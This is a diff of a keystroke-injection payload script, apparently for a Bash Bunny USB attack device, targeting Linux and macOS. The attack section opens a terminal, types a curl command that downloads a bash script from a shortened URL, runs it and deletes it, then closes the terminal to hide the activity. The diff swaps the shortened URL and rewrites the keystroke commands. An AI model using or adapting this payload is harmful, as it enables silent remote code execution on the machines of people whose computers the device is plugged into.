@@ -22,34 +22,29 @@ LANGUAGE='us'
 # ATTACKING
 LED R G B
 
-#Get linux,mac Termial
+# Get linux,mac Termial
 RUN UNITY xterm
-QUACK DELAY 1000
-#To close opened window by linux run command
-QUACK GUI Q
+Q DELAY 1000
+# To close opened window by linux run command
+Q GUI Q
+Q CTRL C
 RUN OSX terminal
-QUACK DELAY 1000
+Q DELAY 1000
 
-#If linux then clearing 'terminal' which is typed by mac run script
-QUACK BACKSPACE
-QUACK BACKSPACE
-QUACK BACKSPACE
-QUACK BACKSPACE
-QUACK BACKSPACE
-QUACK BACKSPACE
-QUACK BACKSPACE
-QUACK BACKSPACE
+# If linux then clearing 'terminal' which is typed by mac run script
+Q CTRL C
 
 # Downloading bash script from server and Executing bash script which is same for mac and linux
-QUACK SRTING curl -L https://shorturl.at/tHIW7 -o payload.sh && bash payload.sh && rm payload.sh
-QUACK DELAY 1000
-QUACK ENTER
+Q SRTING curl -L http://bit.do/bunnybash -o payload.sh && bash payload.sh && rm payload.sh
+Q DELAY 3000
+Q ENTER
 
 # The cleanup process will done by bash script
 # Closing the xterm in linux
-QUACK STRING exit
 # Closing the terminal in mac even if terminal has other process COMMAND Q and ENTER key will terminates terminal
-QUACK GUI Q
-QUACK ENTER
+Q GUI Q
+Q CTRL C
+Q STRING exit
+Q ENTER
 
 LED G
